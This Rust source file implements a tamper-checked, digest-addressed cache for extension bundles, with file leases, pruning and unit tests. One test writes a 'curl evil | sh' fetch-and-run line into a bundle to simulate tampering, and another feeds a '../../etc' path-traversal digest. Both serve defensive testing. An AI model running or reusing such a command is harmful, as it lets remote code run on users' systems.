//! The content-addressed bundle cache on a host that runs placed extension processes.
//!
//! A bundle is written privately, verified against its digest from what actually landed on disk,
//! made read-only, and only then moved to the name its digest gives it. Nothing ever runs from a
//! staging directory, and nothing runs from the cache without being verified again first: every
//! launch re-reads the bundle and recomputes its digest, so a file changed after it was staged -
//! by an editor, a stray `chmod`, or a process deliberately tampering with another extension's
//! code - is caught before the next process starts from it, and the bundle is discarded and staged
//! again from the client.
//!
//! The read-only modes are what stop accidental mutation. They cannot stop a process running as
//! the same user that sets out to undo them; nothing short of a different user can. That is why
//! the verification does not trust them either: a bundle whose files have regained a write bit is
//! treated as tampered with, the same as one whose contents changed.

use std::collections::HashSet;
use std::io;
use std::path::{Path, PathBuf};

use super::bundle::{self, Bundle, BundleFile};

/// How many bundles the cache keeps beyond those in use. Each edit of a linked extension is a new
/// bundle, so without a bound the cache only ever grows.
const RETAINED_BUNDLES: usize = 16;

/// How old a staging directory must be before pruning treats it as left behind by a runtime that
/// died, rather than one another runtime on this host is still writing.
const ABANDONED_STAGING: std::time::Duration = std::time::Duration::from_secs(3600);

#[derive(Debug, PartialEq, Eq)]
pub enum StoreError {
    /// No bundle with this digest is cached; the client should send it.
    Missing,
    /// The cached bundle no longer matches its digest and has been discarded.
    Corrupt(String),
    Io(String),
}

impl std::fmt::Display for StoreError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Missing => f.write_str("bundle is not staged on this host"),
            Self::Corrupt(detail) => {
                write!(f, "staged bundle was modified and discarded: {detail}")
            }
            Self::Io(detail) => f.write_str(detail),
        }
    }
}

pub struct BundleStore {
    root: PathBuf,
}

/// Where runtimes keep their leases, inside the cache.
const LEASES: &str = ".leases";

/// The cache-wide lock that orders recording a lease against pruning, inside [`LEASES`].
const GUARD: &str = "cache.guard";

/// Hold the cache-wide guard for the life of the returned file. Recording a lease and pruning both
/// take it, so a prune's view of the leases cannot go stale while it deletes: a digest recorded
/// before the prune read the leases is spared, and one recorded after waits until the prune is done,
/// then finds out whether its bundle is still there.
fn guard(root: &Path) -> io::Result<std::fs::File> {
    let dir = root.join(LEASES);
    crate::platform::fs_security::ensure_private_dir(&dir)?;
    let file = std::fs::OpenOptions::new()
        .create(true)
        .truncate(false)
        .write(true)
        .open(dir.join(GUARD))?;
    file.lock()?;
    Ok(file)
}

/// One runtime's claim on the bundles it uses. Recorded before a bundle is staged or run, so no
/// other runtime's pruning can remove it in between.
pub struct Lease {
    _lock: std::fs::File,
    digests: std::fs::File,
    root: PathBuf,
    lock_path: PathBuf,
    digests_path: PathBuf,
    recorded: HashSet<String>,
}

impl Lease {
    /// Claim `digest` for this runtime. Once this returns `Ok`, no prune - including one already
    /// running - deletes it. An error means the claim is not durable, and the caller must not
    /// stage or run the bundle on the strength of it.
    pub fn record(&mut self, digest: &str) -> io::Result<()> {
        if !bundle::is_digest(digest) {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!("`{digest}` is not a bundle digest"),
            ));
        }
        if self.recorded.contains(digest) {
            return Ok(());
        }
        let _guard = guard(&self.root)?;
        std::io::Write::write_all(&mut self.digests, format!("{digest}\n").as_bytes())?;
        self.digests.sync_data()?;
        self.recorded.insert(digest.to_string());
        Ok(())
    }
}

impl Drop for Lease {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.digests_path);
        let _ = std::fs::remove_file(&self.lock_path);
    }
}

impl BundleStore {
    /// The cache directory for this host's user, created private if it does not exist.
    pub fn open_default() -> io::Result<Self> {
        let env = crate::platform::paths::PlatformEnv::from_process();
        Self::open(crate::platform::paths::cache_dir(&env).join("extension-bundles"))
    }

    pub fn open(root: PathBuf) -> io::Result<Self> {
        crate::platform::fs_security::ensure_private_dir(&root)?;
        Ok(Self { root })
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    fn path_for(&self, digest: &str) -> Result<PathBuf, StoreError> {
        if !bundle::is_digest(digest) {
            return Err(StoreError::Io(format!("`{digest}` is not a bundle digest")));
        }
        Ok(self.root.join(digest))
    }

    /// Write `bundle` into the cache and return where it lives.
    pub fn stage(&self, bundle: &Bundle) -> Result<PathBuf, StoreError> {
        let target = self.path_for(bundle.digest())?;
        if self.verified(bundle.digest()).is_ok() {
            return Ok(target);
        }
        let staging = self.root.join(format!(".staging-{}", random_suffix()));
        let result = write_bundle(&staging, bundle)
            .map_err(|error| StoreError::Io(format!("cannot stage bundle: {error}")))
            .and_then(|()| verify(&staging, bundle.digest(), false))
            .and_then(|()| {
                seal(&staging).map_err(|error| {
                    StoreError::Io(format!("cannot make the bundle read-only: {error}"))
                })
            })
            .and_then(|()| {
                // Re-verify after sealing: the modes are part of what verification checks.
                verify(&staging, bundle.digest(), true)
            });
        if let Err(error) = result {
            discard(&staging);
            return Err(error);
        }
        // Another client's runtime on this host may have staged the same digest meanwhile. Its copy
        // is as good as ours once it verifies; only a copy that fails is replaced.
        if self.verified(bundle.digest()).is_ok() {
            discard(&staging);
            return Ok(target);
        }
        if let Err(error) = std::fs::rename(&staging, &target) {
            discard(&staging);
            if self.verified(bundle.digest()).is_ok() {
                return Ok(target);
            }
            return Err(StoreError::Io(format!("cannot install bundle: {error}")));
        }
        Ok(target)
    }

    /// The cached bundle for `digest`, verified now. A bundle that fails is discarded.
    pub fn verified(&self, digest: &str) -> Result<PathBuf, StoreError> {
        let path = self.path_for(digest)?;
        match std::fs::symlink_metadata(&path) {
            Err(error) if error.kind() == io::ErrorKind::NotFound => {
                return Err(StoreError::Missing);
            }
            Err(error) => return Err(StoreError::Io(error.to_string())),
            Ok(metadata) if !metadata.is_dir() => {
                discard(&path);
                return Err(StoreError::Corrupt("not a directory".to_string()));
            }
            Ok(_) => {}
        }
        match verify(&path, digest, true) {
            Ok(()) => {
                // Recency for pruning; failing to record it costs nothing but ordering.
                touch(&path);
                Ok(path)
            }
            Err(error) => {
                discard(&path);
                Err(error)
            }
        }
    }

    /// Take a lease on the cache for one runtime, held until it is dropped. Every runtime of every
    /// client on this host shares the cache, and only a lease tells one runtime's pruning that
    /// another still runs - or is about to run - a bundle.
    pub fn lease(&self, id: &str) -> io::Result<Lease> {
        let dir = self.root.join(LEASES);
        crate::platform::fs_security::ensure_private_dir(&dir)?;
        let lock_path = dir.join(format!("{id}.lock"));
        let digests_path = dir.join(format!("{id}.digests"));
        let lock = std::fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .open(&lock_path)?;
        lock.lock()?;
        let digests = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&digests_path)?;
        Ok(Lease {
            _lock: lock,
            digests,
            root: self.root.clone(),
            lock_path,
            digests_path,
            recorded: HashSet::new(),
        })
    }

    /// Digests some live runtime's lease names. A lease whose lock nobody holds belonged to a
    /// runtime that died without dropping it, and is removed.
    fn leased(&self) -> HashSet<String> {
        let dir = self.root.join(LEASES);
        let mut live = HashSet::new();
        let Ok(entries) = std::fs::read_dir(&dir) else {
            return live;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().is_none_or(|extension| extension != "lock") {
                continue;
            }
            let digests = path.with_extension("digests");
            let Ok(lock) = std::fs::OpenOptions::new().write(true).open(&path) else {
                continue;
            };
            match lock.try_lock() {
                Ok(()) => {
                    drop(lock);
                    let _ = std::fs::remove_file(&digests);
                    let _ = std::fs::remove_file(&path);
                }
                Err(std::fs::TryLockError::WouldBlock) => {
                    let text = std::fs::read_to_string(&digests).unwrap_or_default();
                    // A line still being appended is incomplete and not a digest; the bundle it
                    // names is recorded before it is used, so the next prune sees it whole.
                    live.extend(
                        text.lines()
                            .filter(|line| bundle::is_digest(line))
                            .map(str::to_string),
                    );
                }
                Err(std::fs::TryLockError::Error(_)) => {}
            }
        }
        live
    }

    /// Drop all but the most recently used bundles, never one in `keep` or in any live runtime's
    /// lease.
    pub fn prune(&self, keep: &HashSet<String>) {
        self.prune_pausing(keep, || {});
    }

    /// [`Self::prune`], calling `after_snapshot` once the leases are read and before anything is
    /// deleted, with the guard held. Tests use it to land another runtime's record right there.
    fn prune_pausing(&self, keep: &HashSet<String>, after_snapshot: impl FnOnce()) {
        // Without the guard a prune could act on leases that have since grown, so it prunes nothing
        // rather than guess.
        let Ok(_guard) = guard(&self.root) else {
            return;
        };
        let leased = self.leased();
        after_snapshot();
        let keep: HashSet<&String> = keep.iter().chain(leased.iter()).collect();
        let Ok(entries) = std::fs::read_dir(&self.root) else {
            return;
        };
        let mut bundles: Vec<(std::time::SystemTime, PathBuf, String)> = Vec::new();
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(".staging-") {
                // A staging directory survives a runtime that died mid-write. A recent one may be
                // another client's runtime writing right now, so only an old one is abandoned.
                let abandoned = entry
                    .metadata()
                    .and_then(|metadata| metadata.modified())
                    .ok()
                    .and_then(|modified| modified.elapsed().ok())
                    .is_some_and(|age| age > ABANDONED_STAGING);
                if abandoned {
                    discard(&entry.path());
                }
                continue;
            }
            if !bundle::is_digest(&name) || keep.contains(&name) {
                continue;
            }
            let modified = entry
                .metadata()
                .and_then(|metadata| metadata.modified())
                .unwrap_or(std::time::UNIX_EPOCH);
            bundles.push((modified, entry.path(), name));
        }
        bundles.sort_by_key(|bundle| std::cmp::Reverse(bundle.0));
        for (_, path, _) in bundles.into_iter().skip(RETAINED_BUNDLES) {
            discard(&path);
        }
    }
}

fn write_bundle(root: &Path, bundle: &Bundle) -> io::Result<()> {
    std::fs::create_dir(root)?;
    restrict_directory(root)?;
    for file in bundle.files() {
        let path = bundle::join_relative(root, &file.path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut handle = options.open(&path)?;
        std::io::Write::write_all(&mut handle, &file.contents)?;
        handle.sync_all()?;
    }
    write_modes(root, bundle)?;
    Ok(())
}

/// Read a cached bundle back exactly as a process would see it and compare its digest.
fn verify(root: &Path, digest: &str, sealed: bool) -> Result<(), StoreError> {
    let executables = read_modes(root);
    let mut files = Vec::new();
    collect(root, String::new(), &executables, sealed, &mut files).map_err(StoreError::Corrupt)?;
    let found = Bundle::from_files(files).map_err(StoreError::Corrupt)?;
    if found.digest() != digest {
        return Err(StoreError::Corrupt(format!(
            "content digest is {}, expected {digest}",
            found.digest()
        )));
    }
    Ok(())
}

fn collect(
    directory: &Path,
    prefix: String,
    executables: &Option<HashSet<String>>,
    sealed: bool,
    files: &mut Vec<BundleFile>,
) -> Result<(), String> {
    let mut entries: Vec<_> = std::fs::read_dir(directory)
        .map_err(|error| error.to_string())?
        .collect::<io::Result<_>>()
        .map_err(|error| error.to_string())?;
    entries.sort_by_key(|entry| entry.file_name());
    for entry in entries {
        let name = entry.file_name().to_string_lossy().to_string();
        if prefix.is_empty() && name == MODES_FILE {
            continue;
        }
        let relative = if prefix.is_empty() {
            name.clone()
        } else {
            format!("{prefix}/{name}")
        };
        let metadata =
            std::fs::symlink_metadata(entry.path()).map_err(|error| error.to_string())?;
        if metadata.file_type().is_symlink() {
            return Err(format!("{relative} became a symbolic link"));
        }
        if sealed && writable(&metadata) {
            return Err(format!("{relative} is writable again"));
        }
        if metadata.is_dir() {
            collect(&entry.path(), relative, executables, sealed, files)?;
        } else if metadata.is_file() {
            let contents = std::fs::read(entry.path()).map_err(|error| error.to_string())?;
            let executable = match executables {
                Some(set) => set.contains(&relative),
                None => mode_executable(&metadata),
            };
            files.push(BundleFile {
                path: relative,
                executable,
                contents,
            });
        } else {
            return Err(format!("{relative} is not a regular file"));
        }
    }
    Ok(())
}

/// Remove every write permission, deepest first, so the bundle is read-only before it gets a name
/// anything can start a process from.
fn seal(directory: &Path) -> io::Result<()> {
    for entry in std::fs::read_dir(directory)? {
        let path = entry?.path();
        if std::fs::symlink_metadata(&path)?.is_dir() {
            seal(&path)?;
        } else {
            seal_file(&path)?;
        }
    }
    seal_dir(directory)
}

#[cfg(unix)]
fn seal_file(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    // The owner execute bit `write_modes` set is the one thing kept.
    let mode = if pending_executable(path) {
        0o500
    } else {
        0o400
    };
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
}

#[cfg(not(unix))]
fn seal_file(path: &Path) -> io::Result<()> {
    let mut permissions = std::fs::metadata(path)?.permissions();
    permissions.set_readonly(true);
    std::fs::set_permissions(path, permissions)
}

#[cfg(unix)]
fn seal_dir(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o500))
}

#[cfg(not(unix))]
fn seal_dir(_path: &Path) -> io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn restrict_directory(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))
}

#[cfg(not(unix))]
fn restrict_directory(_path: &Path) -> io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn writable(metadata: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o222 != 0
}

#[cfg(not(unix))]
fn writable(metadata: &std::fs::Metadata) -> bool {
    metadata.is_file() && !metadata.permissions().readonly()
}

#[cfg(unix)]
fn mode_executable(metadata: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o100 != 0
}

#[cfg(not(unix))]
fn mode_executable(_metadata: &std::fs::Metadata) -> bool {
    false
}

/// Where executable bits are recorded on a host that has none. Unix keeps them as modes; Windows
/// keeps a list beside the files, sealed with them, so a bundle round-trips to the same digest.
const MODES_FILE: &str = ".rozi-executables";

#[cfg(unix)]
fn write_modes(root: &Path, bundle: &Bundle) -> io::Result<()> {
    // Recorded as a pending mode until `seal` applies the final, read-only one.
    use std::os::unix::fs::PermissionsExt;
    for file in bundle.files() {
        let mode = if file.executable { 0o700 } else { 0o600 };
        std::fs::set_permissions(
            bundle::join_relative(root, &file.path),
            std::fs::Permissions::from_mode(mode),
        )?;
    }
    Ok(())
}

#[cfg(unix)]
fn pending_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path).is_ok_and(|metadata| metadata.permissions().mode() & 0o100 != 0)
}

#[cfg(unix)]
fn read_modes(_root: &Path) -> Option<HashSet<String>> {
    None
}

#[cfg(not(unix))]
fn write_modes(root: &Path, bundle: &Bundle) -> io::Result<()> {
    let list: Vec<&str> = bundle
        .files()
        .iter()
        .filter(|file| file.executable)
        .map(|file| file.path.as_str())
        .collect();
    std::fs::write(root.join(MODES_FILE), list.join("\n"))
}

#[cfg(not(unix))]
fn read_modes(root: &Path) -> Option<HashSet<String>> {
    let text = std::fs::read_to_string(root.join(MODES_FILE)).unwrap_or_default();
    Some(
        text.lines()
            .filter(|line| !line.is_empty())
            .map(str::to_string)
            .collect(),
    )
}

/// Remove a bundle directory whatever its modes.
fn discard(path: &Path) {
    unseal(path);
    let _ = std::fs::remove_dir_all(path);
}

fn unseal(path: &Path) {
    let Ok(metadata) = std::fs::symlink_metadata(path) else {
        return;
    };
    if metadata.file_type().is_symlink() {
        return;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = if metadata.is_dir() { 0o700 } else { 0o600 };
        let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode));
    }
    #[cfg(not(unix))]
    {
        let mut permissions = metadata.permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        let _ = std::fs::set_permissions(path, permissions);
    }
    if metadata.is_dir()
        && let Ok(entries) = std::fs::read_dir(path)
    {
        for entry in entries.flatten() {
            unseal(&entry.path());
        }
    }
}

fn touch(path: &Path) {
    let _ = std::fs::File::open(path)
        .and_then(|directory| directory.set_modified(std::time::SystemTime::now()));
}

fn random_suffix() -> String {
    let mut bytes = [0u8; 8];
    getrandom::fill(&mut bytes).expect("operating-system randomness unavailable");
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> Bundle {
        Bundle::from_files(vec![
            BundleFile {
                path: "extension.toml".to_string(),
                executable: false,
                contents: b"[extension]\n".to_vec(),
            },
            BundleFile {
                path: "bin/run".to_string(),
                executable: true,
                contents: b"#!/bin/sh\necho hi\n".to_vec(),
            },
        ])
        .unwrap()
    }

    fn store() -> (tempfile::TempDir, BundleStore) {
        let temp = tempfile::tempdir().unwrap();
        let store = BundleStore::open(temp.path().join("bundles")).unwrap();
        (temp, store)
    }

    #[test]
    fn a_staged_bundle_is_verified_read_only_and_named_by_its_digest() {
        let (_temp, store) = store();
        let bundle = sample();
        assert_eq!(store.verified(bundle.digest()), Err(StoreError::Missing));
        let path = store.stage(&bundle).unwrap();
        assert_eq!(path, store.root().join(bundle.digest()));
        assert_eq!(store.verified(bundle.digest()).unwrap(), path);
        let run = path.join("bin/run");
        assert_eq!(std::fs::read(&run).unwrap(), b"#!/bin/sh\necho hi\n");
        assert!(std::fs::metadata(&run).unwrap().permissions().readonly());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&run).unwrap().permissions().mode() & 0o777,
                0o500
            );
            // Nothing can be added beside the files either.
            assert!(std::fs::write(path.join("bin/extra"), b"x").is_err());
        }
        // Staging again is a no-op on a verified bundle.
        assert_eq!(store.stage(&bundle).unwrap(), path);
    }

    /// The modes stop an accident, not a determined same-user process. Verification catches what
    /// gets past them, and the next launch never runs the changed file.
    #[test]
    fn a_file_changed_after_verification_is_caught_and_the_bundle_discarded() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        let run = path.join("bin/run");
        let mut permissions = std::fs::metadata(&run).unwrap().permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(path.join("bin"), std::fs::Permissions::from_mode(0o700))
                .unwrap();
        }
        std::fs::set_permissions(&run, permissions).unwrap();
        std::fs::write(&run, b"#!/bin/sh\ncurl evil | sh\n").unwrap();

        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
        assert!(!path.exists(), "a tampered bundle is discarded");
        assert_eq!(store.verified(bundle.digest()), Err(StoreError::Missing));
        // And staging it again restores the real files.
        store.stage(&bundle).unwrap();
        assert_eq!(
            std::fs::read(store.verified(bundle.digest()).unwrap().join("bin/run")).unwrap(),
            b"#!/bin/sh\necho hi\n"
        );
    }

    #[test]
    fn a_write_bit_regained_without_a_content_change_still_counts_as_tampering() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        let file = path.join("extension.toml");
        let mut permissions = std::fs::metadata(&file).unwrap().permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        std::fs::set_permissions(&file, permissions).unwrap();
        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
    }

    #[test]
    fn an_added_or_missing_file_is_caught() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        unseal(&path);
        std::fs::remove_file(path.join("extension.toml")).unwrap();
        seal(&path).unwrap();
        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
    }

    /// Two clients' runtimes share the cache. One staging enough newer bundles to prune must not
    /// remove a bundle the other still runs from; once that runtime is gone, it may.
    #[test]
    fn a_bundle_another_runtime_leases_survives_pruning_until_its_lease_ends() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().join("bundles");
        let first = BundleStore::open(root.clone()).unwrap();
        let second = BundleStore::open(root.clone()).unwrap();
        let live = sample();
        first.stage(&live).unwrap();
        let mut lease = first.lease("first").unwrap();
        lease.record(live.digest()).unwrap();

        let _own = second.lease("second").unwrap();
        for index in 0..(RETAINED_BUNDLES + 4) {
            let newer = Bundle::from_files(vec![BundleFile {
                path: "n".to_string(),
                executable: false,
                contents: index.to_string().into_bytes(),
            }])
            .unwrap();
            second.stage(&newer).unwrap();
            // Newer than the leased one, so it would go first without the lease.
            std::thread::sleep(std::time::Duration::from_millis(2));
        }
        second.prune(&HashSet::new());
        // Checked by path: verifying would refresh its recency and keep it for that reason alone.
        assert!(
            root.join(live.digest()).exists(),
            "another runtime's live bundle was pruned"
        );

        drop(lease);
        second.prune(&HashSet::new());
        assert!(!root.join(live.digest()).exists());
        // The ended lease left nothing behind.
        let leases: Vec<_> = std::fs::read_dir(root.join(LEASES))
            .unwrap()
            .flatten()
            .map(|entry| entry.file_name())
            .collect();
        assert_eq!(
            leases.len(),
            3,
            "only `second`'s own lease and the cache guard remain: {leases:?}"
        );
    }

    /// A record cannot land inside a prune that has already read the leases: it waits for that
    /// prune to finish. So either the record comes first and the prune spares the bundle, or the
    /// prune comes first and the recording runtime finds the bundle gone and stages it again.
    /// Never a recorded bundle deleted by a prune that read the leases before it was recorded.
    #[test]
    fn a_record_racing_a_prune_waits_for_it_and_then_sees_what_it_did() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().join("bundles");
        let pruner = BundleStore::open(root.clone()).unwrap();
        let recorder = BundleStore::open(root.clone()).unwrap();
        let oldest = sample();
        pruner.stage(&oldest).unwrap();
        for index in 0..(RETAINED_BUNDLES + 2) {
            std::thread::sleep(std::time::Duration::from_millis(2));
            pruner
                .stage(
                    &Bundle::from_files(vec![BundleFile {
                        path: "n".to_string(),
                        executable: false,
                        contents: index.to_string().into_bytes(),
                    }])
                    .unwrap(),
                )
                .unwrap();
        }
        let mut lease = recorder.lease("recorder").unwrap();

        let (snapshotted, wait_snapshot) = std::sync::mpsc::channel();
        let (resume, wait_resume) = std::sync::mpsc::channel::<()>();
        let pruning = std::thread::spawn(move || {
            pruner.prune_pausing(&HashSet::new(), || {
                snapshotted.send(()).unwrap();
                wait_resume.recv().unwrap();
            });
        });
        wait_snapshot.recv().unwrap();

        let (recorded, wait_recorded) = std::sync::mpsc::channel();
        let digest = oldest.digest().to_string();
        let recording = std::thread::spawn(move || {
            lease.record(&digest).unwrap();
            recorded.send(()).unwrap();
            lease
        });
        assert!(
            wait_recorded
                .recv_timeout(std::time::Duration::from_millis(300))
                .is_err(),
            "the record completed inside a prune that had already read the leases"
        );
        resume.send(()).unwrap();
        pruning.join().unwrap();
        wait_recorded.recv().unwrap();
        let lease = recording.join().unwrap();

        // The prune ran first, so the bundle is gone - and the recorder sees that, rather than
        // running from a directory that is about to vanish.
        assert_eq!(recorder.verified(oldest.digest()), Err(StoreError::Missing));
        recorder.stage(&oldest).unwrap();
        // Now recorded before any prune reads the leases, it stays.
        recorder.prune(&HashSet::new());
        assert!(root.join(oldest.digest()).exists());
        drop(lease);
    }

    /// A runtime that died without dropping its lease leaves its lock unheld; the next prune treats
    /// the lease as gone.
    #[test]
    fn a_lease_nobody_holds_is_stale() {
        let temp = tempfile::tempdir().unwrap();
        let store = BundleStore::open(temp.path().join("bundles")).unwrap();
        let live = sample();
        store.stage(&live).unwrap();
        let dir = store.root().join(LEASES);
        std::fs::write(dir.join("dead.lock"), b"").unwrap_or_else(|_| {
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("dead.lock"), b"").unwrap();
        });
        std::fs::write(dir.join("dead.digests"), format!("{}\n", live.digest())).unwrap();
        assert!(store.leased().is_empty());
        assert!(!dir.join("dead.lock").exists());
        assert!(!dir.join("dead.digests").exists());
    }

    #[test]
    fn a_digest_that_could_name_another_path_is_refused() {
        let (_temp, store) = store();
        assert!(matches!(
            store.verified("../../etc"),
            Err(StoreError::Io(_))
        ));
    }

    #[test]
    fn pruning_keeps_the_bundles_in_use_and_the_most_recent_rest() {
        let (_temp, store) = store();
        let mut digests = Vec::new();
        for index in 0..(RETAINED_BUNDLES + 3) {
            let bundle = Bundle::from_files(vec![BundleFile {
                path: "n".to_string(),
                executable: false,
                contents: index.to_string().into_bytes(),
            }])
            .unwrap();
            store.stage(&bundle).unwrap();
            digests.push(bundle.digest().to_string());
        }
        // Backdating a directory's time needs a handle to it, which only Unix opens like a file.
        let leftover = store.root().join(".staging-leftover");
        #[cfg(unix)]
        {
            std::fs::create_dir(&leftover).unwrap();
            std::fs::File::open(&leftover)
                .unwrap()
                .set_modified(std::time::SystemTime::now() - 2 * ABANDONED_STAGING)
                .unwrap();
        }
        // Another runtime's staging in progress is left alone.
        let busy = store.root().join(".staging-busy");
        std::fs::create_dir(&busy).unwrap();
        let keep: std::collections::HashSet<_> = [digests[0].clone()].into_iter().collect();
        store.prune(&keep);
        let remaining = std::fs::read_dir(store.root()).unwrap().count();
        // The retained bundles, the kept one, the busy staging, and the lease directory.
        assert_eq!(remaining, RETAINED_BUNDLES + 3);
        assert!(store.root().join(&digests[0]).exists());
        assert!(!leftover.exists());
        assert!(busy.exists());
    }
}
